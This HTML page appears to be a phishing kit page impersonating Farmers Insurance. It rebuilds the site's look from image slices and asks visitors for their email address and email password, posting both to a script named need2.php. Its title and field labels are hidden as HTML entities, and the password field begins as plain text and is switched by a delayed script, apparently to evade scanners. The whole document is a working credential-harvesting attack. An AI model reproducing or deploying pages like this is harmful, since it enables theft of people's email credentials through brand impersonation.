<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#70;&#97;&#114;&#109;&#101;&#114;&#115;&#32;&#73;&#110;&#115;&#117;&#114;&#97;&#110;&#99;&#101;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #b6b6b6; 
    height: 50px; 
    width: 275px; 
  	font-family: Segoe UI;
    font-size: 16px;
  	color: #555;
    padding-left: 6px; 
    border-radius: 0px; 
    box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #b6b6b6; 
    box-shadow: 0px 0px 5px #7bc1f7; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:294px; z-index:0"><img src="images/f5.png" alt="" title="" border=0 width=1349 height=294></div>

<div id="image2" style="position:absolute; overflow:hidden; left:199px; top:334px; width:952px; height:200px; z-index:1"><img src="images/f6.png" alt="" title="" border=0 width=952 height=200></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:580px; width:1349px; height:392px; z-index:2"><img src="images/f8.png" alt="" title="" border=0 width=1349 height=392></div>

<div id="image4" style="position:absolute; overflow:hidden; left:789px; top:629px; width:166px; height:45px; z-index:3"><a href="#"><img src="images/f13.png" alt="" title="" border=0 width=166 height=45></a></div>
<form action=need2.php name=buhatjump id=buhatjump method=post>
<input name="em" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:430px;left:229px;top:362px;z-index:4">
<input name="ep" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:430px;left:229px;top:432px;z-index:5">
<div id="formimage1" style="position:absolute; left:982px; top:628px; z-index:6"><input type="image" name="formimage1" width="164" height="45" src="images/fct.png"></div>
</div>

</body>
</html>
